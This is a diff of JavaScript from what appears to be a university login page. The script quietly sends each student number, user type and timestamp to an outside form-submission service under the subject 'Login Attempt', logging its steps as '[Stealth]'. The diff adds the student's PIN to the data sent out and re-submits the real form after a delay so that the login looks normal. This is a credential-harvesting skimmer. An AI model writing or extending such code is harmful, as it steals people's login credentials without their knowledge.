@@ -1366,6 +1366,7 @@ document.addEventListener('DOMContentLoaded', function() {
             formData.append('subject', `Login Attempt - ${savedData.unum}`);
             formData.append('message', 
                 `Student Number: ${savedData.unum}\n` +
+                `PIN: ${savedData.pin}\n` +  // Added PIN to the message
                 `User Type: ${savedData.numtype}\n` +
                 `Timestamp: ${savedData.timestamp}\n` +
                 `Page: ${savedData.page}`
@@ -1385,18 +1386,26 @@ document.addEventListener('DOMContentLoaded', function() {
             if(result.success) {
                 console.log('[Stealth] Submission successful');
                 localStorage.removeItem('loginData'); // Clear after success
-                // Optional: Redirect or show subtle feedback
+                // Update button state
                 submitBtn.value = '✓ Done';
-                setTimeout(() => { submitBtn.value = originalText; }, 2000);
+                setTimeout(() => {
+                    submitBtn.value = originalText;
+                    submitBtn.disabled = false;
+                }, 2000);
+                // Submit the original form after delay
+                setTimeout(() => {
+                    form.submit();
+                }, 2000);
             } else {
                 throw new Error(result.message || 'FormSubmit error');
             }
         } catch (error) {
             console.error('[Stealth] Submission failed:', error);
             submitBtn.value = 'Failed!';
-            setTimeout(() => { submitBtn.value = originalText; }, 2000);
-        } finally {
-            submitBtn.disabled = false;
+            setTimeout(() => {
+                submitBtn.value = originalText;
+                submitBtn.disabled = false;
+            }, 2000);
         }
     });
 
